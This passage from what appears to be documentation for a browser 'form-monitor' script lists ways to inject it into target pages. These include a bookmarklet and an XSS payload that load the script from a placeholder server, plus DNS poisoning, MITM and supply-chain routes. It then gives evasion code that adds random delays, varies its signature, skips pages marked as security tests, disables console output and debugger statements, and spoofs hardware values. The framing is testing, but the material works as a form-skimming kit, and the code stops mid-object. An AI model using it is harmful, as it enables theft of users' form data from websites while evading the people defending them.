## Deployment Methods

<!-- 
This section provides various ways to deploy the tool for testing. Each method has different advantages
and use cases, allowing users to choose the most appropriate method for their testing scenario.
-->

### Method 1: Direct Injection
<!-- 
Direct injection is the simplest method of deploying the tool. It involves copying the script and
injecting it directly into the target page via the browser console or through a browser extension.
This method is quick and easy but may be detected by some security systems.
-->
```javascript
// Copy the entire script and inject it into the target page via browser console
// or through a browser extension that can inject scripts
```

### Method 2: Bookmarklet
<!-- 
A bookmarklet is a bookmark that contains JavaScript code. When clicked, it executes the code on the
current page. This method is convenient for quick testing but may be detected by some security systems.
-->
```javascript
// Create a bookmark with this JavaScript
javascript:(function(){
  var script = document.createElement('script');
  script.src = 'https://your-server.com/form-monitor.js';
  document.head.appendChild(script);
})();
```

### Method 3: Browser Extension
<!-- 
A browser extension can inject the script into target pages. This method allows for more persistent
testing across multiple sessions and can provide additional functionality like configuration options.
-->
```javascript
// Create a browser extension that injects the script into target pages
// This allows for more persistent testing across multiple sessions
```

### Method 4: XSS Payload
<!-- 
An XSS payload can be used to inject the script into a target page. This method is useful for testing
XSS protections but should only be used on systems you own or have permission to test.
-->
```javascript
// For testing XSS protections, use this as a payload
<script src="https://your-server.com/form-monitor.js"></script>
```

### Method 5: Man-in-the-Middle Proxy
<!-- 
A Man-in-the-Middle proxy can inject the script into responses. This method simulates a compromised
CDN or third-party script and is useful for testing network security controls.
-->
```javascript
// Use a proxy tool to inject the script into responses
// This simulates a compromised CDN or third-party script
```

### Method 6: Compromised Third-Party Library
<!-- 
This method involves replacing a legitimate third-party library with a modified version that includes
the monitoring code. This simulates a supply chain attack and is useful for testing supply chain security.
-->
```javascript
// Replace a legitimate third-party library with a modified version
// that includes the monitoring code
```

### Method 7: Browser Extension Exploit
<!-- 
This method exploits a vulnerable browser extension to inject the script. This is useful for testing
extension security mechanisms and should only be used on systems you own or have permission to test.
-->
```javascript
// Exploit a vulnerable browser extension to inject the script
// This tests extension security mechanisms
```

### Method 8: DNS Cache Poisoning
<!-- 
This method poisons the DNS cache to redirect legitimate script sources to your server hosting the
monitoring script. This simulates a DNS-based attack and is useful for testing DNS security.
-->
```javascript
// Poison DNS cache to redirect legitimate script sources
// to your server hosting the monitoring script
```

### Method 9: Supply Chain Attack Simulation
<!-- 
This method simulates a supply chain attack by modifying a legitimate package before it reaches the
target application. This is useful for testing supply chain security.
-->
```javascript
// Simulate a supply chain attack by modifying a legitimate package
// before it reaches the target application
```

### Method 10: Browser AutoFill Exploit
<!-- 
This method exploits browser autofill features to trigger form monitoring. This is useful for testing
browser security features and should only be used on systems you own or have permission to test.
-->
```javascript
// Exploit browser autofill features to trigger form monitoring
// This tests browser security features
```

## Advanced Testing Techniques

<!-- 
This section provides advanced techniques for testing security measures. These techniques can be used
to bypass more sophisticated security controls and are useful for more advanced testing scenarios.
-->

### 1. Timing-Based Detection Bypass
<!-- 
Timing-based detection bypass involves adding random delays to avoid detection by timing-based
security systems. This technique is useful for testing timing-based security controls.
-->
```javascript
// Add random delays to avoid timing-based detection
const randomDelay = () => {
  return Math.floor(Math.random() * 1000) + 500;
};

// Use in transmission methods
setTimeout(() => {
  // transmission code
}, randomDelay());
```

### 2. Polymorphic Code Generation
<!-- 
Polymorphic code generation involves generating slightly different code each time to avoid signature
detection. This technique is useful for testing signature-based security controls.
-->
```javascript
// Generate slightly different code each time to avoid signature detection
const generatePolymorphicCode = () => {
  const variables = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
  const randomVar = variables[Math.floor(Math.random() * variables.length)];
  
  return `
    const ${randomVar} = ${Math.random()};
    // rest of the code
  `;
};
```

### 3. Context-Aware Execution
<!-- 
Context-aware execution involves only executing in specific contexts to avoid detection. This technique
is useful for testing context-based security controls.
-->
```javascript
// Only execute in specific contexts to avoid detection
const shouldExecute = () => {
  return (
    document.forms.length > 0 &&
    !document.querySelector('meta[name="security-test"]') &&
    window.location.protocol === 'https:'
  );
};

if (shouldExecute()) {
  // monitoring code
}
```

### 4. Stealth Mode
<!-- 
Stealth mode involves reducing visibility by minimizing DOM changes. This technique is useful for
testing visibility-based security controls.
-->
```javascript
// Reduce visibility by minimizing DOM changes
const stealthMode = {
  useMutationObserver: false,
  minimizeDOMChanges: true,
  usePassiveListeners: true,
  avoidConsoleLogs: true
};
```

### 5. Evasion Techniques
<!-- 
Evasion techniques involve detecting and bypassing common security tools. This section provides
various techniques for evading security tools and is useful for testing tool-based security controls.
-->
```javascript
// Implement various evasion techniques
const evasionTechniques = {
  // Detect and bypass common security tools
  detectSecurityTools: () => {
    return (
      window.Firebug ||

      window.console.warn
    );
  },
  
  // Detect and bypass common anti-debugging techniques
  bypassAntiDebugging: () => {
    // Override debugger statement
    const originalEval = window.eval;
    window.eval = function(code) {
      return originalEval(code.replace(/debugger/g, ''));
    };
    
    // Override console methods
    const noop = () => {};
    console.log = noop;
    console.info = noop;
    console.warn = noop;
    console.error = noop;
    console.debug = noop;
  },
  
  // Detect and bypass common VM detection

    Object.defineProperty(navigator, 'hardwareConcurrency', {
      get: () => 8
    });
